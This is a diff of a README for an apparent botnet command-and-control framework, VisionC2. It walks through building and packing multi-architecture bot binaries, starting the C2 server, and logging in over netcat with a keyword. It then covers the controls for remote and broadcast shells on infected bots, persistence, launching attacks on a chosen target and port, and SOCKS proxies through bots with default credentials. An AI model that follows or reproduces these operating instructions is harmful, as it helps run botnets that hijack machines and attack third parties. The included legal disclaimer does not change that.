@@ -69,52 +69,82 @@
 
 ## Installation
 
-### Prerequisites
+
+## 📋 Prerequisites
 
 ```bash
-# Ubuntu/Debian
-sudo apt update && sudo apt install -y \
-    upx-ucl openssl git wget gcc python3 screen build-essential
+sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat
 
-# Install Go (1.24+ required)
-wget https://go.dev/dl/go1.24.0.linux-amd64.tar.gz
-sudo rm -rf /usr/local/go
-sudo tar -C /usr/local -xzf go1.24.0.linux-amd64.tar.gz
-echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
-source ~/.bashrc
-go version  # verify installation
+# Go 1.23+
+wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
+sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
 ```
 
-### Quick Setup
+| Requirement | Minimum | Recommended |
+|---|---|---|
+| RAM / Storage | 512MB / 1GB | 2GB+ / 5GB+ |
+| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
+| Network | Port 443 open | + Admin port for split mode |
 
-1. **Clone the repository**
+---
 
-   ```bash
-   git clone https://github.com/Syn2Much/VisionC2.git
-   cd VisionC2
-   chmod +x setup.py tools/*.sh
-   ```
+## 🚀 Setup
 
-2. **Run interactive setup**
+```bash
+git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
+python3 setup.py   # Select [1] Full Setup
+```
 
-   ```bash
-   python3 setup.py
-   ```
+The wizard prompts for **C2 address**, **admin port** (default: 420), and **TLS cert details**. Output:
 
-   The setup script will:
-   - Generate 4096-bit TLS certificates
-   - Create encryption keys and configuration
-   - Cross-compile binaries for all supported architectures
-   - Build the C2 server binary
+```
+bins/              → 14 bot binaries (multi-arch)
+cnc/certificates/  → server.crt + server.key
+server             → CNC binary
+setup_config.txt   → Config summary
+```
 
-3. **Output locations**
+To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots afterward.
 
-   | Output | Path |
-   |---|---|
-   | C2 Server | `./server` |
-   | Agent Binaries | `./bins/` |
-   | Configuration | `setup_config.txt` |
-   
+---
+
+## 🖥️ Starting the CNC
+
+```bash
+./server              # TUI mode (default, recommended)
+./server --split      # Telnet mode on admin port (default: 420)
+```
+
+**Split mode connect:** `nc YOUR_IP 420` → type `spamtec` → login.
+
+**Background:** `screen -S vision ./server` (detach: `Ctrl+A, D`)
+
+**First run** creates root user with random password — save it.
+
+---
+
+## 🎨 TUI Navigation
+
+| Key | Action |
+|---|---|
+| `↑/↓` or `k/j` | Navigate |
+| `Enter` | Select |
+| `q` / `Esc` | Back / Cancel |
+| `r` | Refresh |
+
+### Dashboard Views
+
+- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
+- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
+- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
+- **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
+- **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
+- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
+- **📜 Connection Logs** — Bot connect/disconnect history
+
+---
+
 
 ### Bot Binaries
 
@@ -131,30 +161,6 @@ go version  # verify installation
  > [`Build.sh`](tools/build.sh) | Full binary map reference 
 ---
 
-## Usage
-
-### Starting the C2 Server
-
-**Option 1: TUI Mode (Recommended)**
-
-```bash
-screen ./server
-```
-
-- Detach: `Ctrl + A` → `D`
-- Reattach: `screen -r`
-
-**Option 2: Telnet/Multi-User Mode**
-
-```bash
-screen ./server --split
-nc your-server-ip 1337
-```
-
-- User database: `cnc/users.json`
-- Login keyword: configured during setup
-
----
 
 ## Architecture
 
@@ -194,7 +200,7 @@ nc your-server-ip 1337
 | [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
 | [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history and changes |
 | [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
-| [`USAGE.md`](Docs/USAGE.md) | Usage guide |
+| [`SETUP.md`](Docs/SETUP.md) | Setup guide|
 
 ---
 
@@ -205,28 +211,6 @@ nc your-server-ip 1337
 > **Usage of this tool for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.**
 
 ---
-## Troubleshooting
-
-
-```
-
-### Bots Not Connecting
-
-1. Check firewall: `sudo ufw allow 443/tcp`
-2. run tool/fix_botkill.sh
-3. Verify C2 in `setup_config.txt`
-4. Test TLS: `openssl s_client -connect YOUR_SERVER:443`
-
-
-### Build Errors
-
-```bash
-# Go not found
-export PATH=$PATH:/usr/local/go/bin
-
-# UPX not found
-sudo apt install upx-ucl
-```
 
 ## Author
 
